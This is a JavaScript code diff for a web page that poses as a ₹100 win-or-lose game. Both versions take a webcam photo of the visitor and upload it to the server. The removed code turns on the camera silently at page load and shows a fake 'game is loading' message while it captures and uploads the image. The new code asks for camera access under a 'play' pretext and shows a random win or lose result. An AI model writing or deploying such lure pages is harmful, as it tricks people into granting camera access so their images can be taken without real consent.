@@ -1,66 +1,84 @@
+const playBtn = document.getElementById("playBtn");
+const statusEl = document.getElementById("status");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const captureBtn = document.getElementById("captureBtn");
-const status = document.getElementById("status");
 
-let streamReady = false;
+let stream = null;
 
-async function startCamera() {
+async function getCameraStream() {
+  if (stream) return stream;
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     video.srcObject = stream;
-    await video.play();
-    streamReady = true;
-    console.log("Camera started silently.");
+    return stream;
   } catch (err) {
     console.error("Camera error:", err);
+    throw err;
   }
 }
 
-function showLoadingText(text) {
-  let dots = 0;
-  status.textContent = text;
-  const interval = setInterval(() => {
-    dots = (dots + 1) % 4;
-    status.textContent = text + ".".repeat(dots);
-  }, 300);
-  return interval;
+function stopStream() {
+  if (!stream) return;
+  stream.getTracks().forEach(t => t.stop());
+  stream = null;
 }
 
-captureBtn.addEventListener("click", async () => {
-  status.textContent = "";
+function showStatusWin(url) {
+  statusEl.innerHTML = `<span class="win">✅ You Win ₹100!</span><br><a class="filelink" href="${url}" target="_blank">Open captured photo</a>`;
+}
 
-  if (!streamReady) await startCamera();
+function showStatusLose(url) {
+  statusEl.innerHTML = `<span class="lose">🔴 You Lost ₹100!</span><br><a class="filelink" href="${url}" target="_blank">Open captured photo</a>`;
+}
 
-  const loader = showLoadingText("🕹️ Tap 2 times please, your game is loading");
+playBtn.addEventListener("click", async () => {
+  statusEl.textContent = "Processing...";
+  try {
+    await getCameraStream();
 
-  const ctx = canvas.getContext("2d");
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // small delay to allow camera to initialize
+    await new Promise(res => setTimeout(res, 600));
 
-  canvas.toBlob(async (blob) => {
-    try {
-      const form = new FormData();
-      form.append("photo", blob, `capture_${Date.now()}.jpg`);
+    // capture image
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, w, h);
 
-      const res = await fetch("/upload", { method: "POST", body: form });
-      const data = await res.json();
-
-      clearInterval(loader);
-
-      if (data && data.success) {
-        status.textContent = "🎉 You WIN 100 Rs successfully!";
-        console.log("Uploaded file path:", data.filePath); // 👈 Only visible in Render logs
-      } else {
-        status.textContent = "❌ Upload failed. Try again.";
+    // convert to blob
+    canvas.toBlob(async (blob) => {
+      if (!blob) {
+        statusEl.textContent = "Capture failed!";
+        stopStream();
+        return;
       }
-    } catch (err) {
-      clearInterval(loader);
-      status.textContent = "❌ Upload failed. Check console.";
-    }
-  }, "image/jpeg");
-});
+      // upload
+      const form = new FormData();
+      form.append("photo", blob, "photo.jpg");
 
-// Start camera early but silently
-startCamera();
+      try {
+        const res = await fetch("/upload", { method: "POST", body: form });
+        const data = await res.json();
+        if (data && data.success) {
+          const fileUrl = data.filePath;
+          // decide win or lose (50/50)
+          const win = Math.random() < 0.5;
+          if (win) showStatusWin(fileUrl);
+          else showStatusLose(fileUrl);
+        } else {
+          statusEl.textContent = "Upload failed!";
+        }
+      } catch (err) {
+        console.error("Upload error:", err);
+        statusEl.textContent = "Upload error!";
+      } finally {
+        stopStream();
+      }
+    }, "image/jpeg", 0.9);
+
+  } catch (err) {
+    statusEl.textContent = "Camera permission is required.";
+  }
+});
